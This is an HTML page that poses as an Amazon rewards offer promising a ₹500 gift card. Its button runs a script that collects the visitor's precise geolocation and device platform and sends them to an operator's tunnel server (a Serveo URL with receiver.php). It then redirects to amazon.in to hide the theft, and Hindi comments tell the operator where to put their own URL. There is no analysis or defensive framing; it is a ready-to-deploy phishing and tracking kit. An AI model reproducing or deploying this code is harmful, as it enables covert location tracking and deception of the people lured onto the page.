<!DOCTYPE html>
<html>
<head>
    <title>Amazon Rewards & System Sync</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #f3f3f3; padding-top: 50px; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
        .amazon-logo { width: 120px; margin-bottom: 20px; }
        .btn { background-color: #febd69; border: 1px solid #a88734; color: #111; padding: 12px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; }
        .btn:hover { background-color: #f3a847; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="amazon-logo">
    <h3>Exclusive Offer Found!</h3>
    <p>Please sync your system services to claim your ₹500 Amazon Gift Card.</p>
    <button id="openBoth" class="btn">Claim & Sync Now</button>
</div>

<script>
    // APNA SERVEO URL YAHAN DALEIN (Example: https://shubh.serveo.net)
    const serverURL = "https://myapp.serveousercontent.com"; 

    function sendData(lat, lon) {
        // Bina Socket.io ke, simple Fetch se data bhejna (PHP ke liye)
        fetch(`${serverURL}/receiver.php?lat=${lat}&lon=${lon}&device=${navigator.platform}`)
        .then(() => {
            // Data bhejne ke turant baad Amazon khul jayega (No Popup Block)
            window.location.href = "https://www.amazon.in";
        })
        .catch(err => {
            // Error ki surat mein bhi Amazon khul jaye
            window.location.href = "https://www.amazon.in";
        });
    }

    document.getElementById("openBoth").addEventListener("click", () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    sendData(lat, lon);
                },
                (error) => {
                    alert("Please allow permissions to sync and get your reward.");
                    // Agar permission deny kare toh bhi Amazon par bhej do
                    window.location.href = "https://www.amazon.in";
                },
                { enableHighAccuracy: true }
            );
        } else {
            window.location.href = "https://www.amazon.in";
        }
    });
</script>

</body>
</html>
